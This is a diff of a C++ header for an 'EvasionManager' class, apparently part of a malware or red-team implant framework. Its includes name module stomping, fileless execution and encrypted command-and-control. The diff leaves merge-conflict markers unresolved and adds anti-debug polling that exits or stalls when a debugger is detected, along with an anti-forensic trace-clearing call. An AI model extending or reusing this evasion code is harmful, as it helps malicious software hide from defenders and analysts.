@@ -18,6 +18,7 @@
 #include "domain/common/ModuleStomping.hpp"
 #include "domain/common/FilelessExec.hpp"
 #include "domain/common/EncryptedC2.hpp"
+#include "domain/common/PerformanceOptimizer.hpp"
 
 namespace nuub::domain {
 
@@ -34,9 +35,14 @@ class EvasionManager {
     bool environment_keying_enabled_ = true;
     bool anti_forensic_enabled_ = false;
 
+<<<<<<< HEAD
     // Shutdown flag for monitoring thread
     static inline std::atomic<bool> shutdown_requested_{false};
     std::thread monitoring_thread_;
+=======
+    // Optimized polling (replaces detached thread)
+    std::unique_ptr<perf::AdaptivePoller> anti_debug_poller_;
+>>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
 
 public:
     struct Config {
@@ -128,9 +134,26 @@ public:
             }
         }
 
+<<<<<<< HEAD
         // 7. Anti-forensic (clear traces after passing all checks)
         if (anti_forensic_enabled_) {
             anti::AntiForensic::clear_traces();
+=======
+        // 5. Start anti-debug monitoring (adaptive, not detached)
+        if (anti_debug_enabled_) {
+            anti_debug_poller_ = std::make_unique<perf::AdaptivePoller>(
+                [this]() {
+                    if (anti::AntiDebug::should_terminate()) {
+                        if (stealth_mode_) {
+                            while (true) Sleep(10000);
+                        }
+                        ExitProcess(0);
+                    }
+                },
+                std::chrono::milliseconds(5000)  // Start at 5s interval
+            );
+            anti_debug_poller_->start();
+>>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
         }
 
         // 8. Start anti-debug monitoring thread (joinable, not detached)
@@ -307,12 +330,18 @@ public:
     bool is_environment_keying_enabled() const { return environment_keying_enabled_; }
     bool is_anti_forensic_enabled() const { return anti_forensic_enabled_; }
 
+<<<<<<< HEAD
 private:
     // Sleep in stealth mode, checking for shutdown
     static void stealth_sleep() {
         while (!shutdown_requested_) {
             Sleep(10000);
         }
+=======
+    // Stop all background monitoring (call before shutdown)
+    void shutdown() {
+        if (anti_debug_poller_) anti_debug_poller_->stop();
+>>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
     }
 };
 
